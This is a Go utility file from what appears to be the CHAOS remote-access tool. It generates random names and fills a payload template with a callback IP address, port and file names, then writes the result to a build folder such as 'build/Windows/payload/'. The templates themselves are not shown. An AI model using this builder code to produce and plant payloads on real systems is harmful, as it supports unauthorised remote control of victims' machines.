package util

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"

	c "github.com/tiagorlampert/CHAOS/src/color"
)

func GeneratePath(str_size int) string {
	characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	var bytes = make([]byte, str_size)
	rand.Read(bytes)
	for i, x := range bytes {
		bytes[i] = characters[x%byte(len(characters))]
	}
	return string(bytes)
}

func TemplateTextReplace(IPAddress string, ServerPort string, FileNameCHAOS string, NameFolderExtesion string, SourceCodeName string, NameTemplate string) {
	input, err := ioutil.ReadFile("src/template/" + NameTemplate + ".go")

	if err != nil {
		fmt.Println(c.RED, "[!] Error to read template!")
		os.Exit(1)
	}

	output := bytes.Replace(input, []byte("IPAddress"), []byte(string(IPAddress)), -1)
	output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ServerPort)), -1)
	output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(FileNameCHAOS)), -1)
	output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(NameFolderExtesion)), -1)

	// Check if folder exist to save source code
	// and if don't exist, create it
	// Where: NameTemplate = TargetOSName
	// Path: build/Windows/payload/
	CheckIfNotExistAndCreateFolder("build/" + NameTemplate + "/" + SourceCodeName + "/")

	if err = ioutil.WriteFile("build/"+NameTemplate+"/"+SourceCodeName+"/"+SourceCodeName+".go", output, 0666); err != nil {
		fmt.Println(c.RED, "[!] Error to write template!")
		os.Exit(1)
	}
}

func CheckIfNotExistAndCreateFolder(name string) {
	if _, err := os.Stat(name); os.IsNotExist(err) {
		os.MkdirAll(name, os.ModePerm)
	}
}

func CheckIfFileExist(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func WaitForCtrlC() {
	signalChan := make(chan os.Signal, 1)
	cleanupDone := make(chan struct{})
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\nReceived an interrupt, stopping services...\n")
	}()
	<-cleanupDone
}
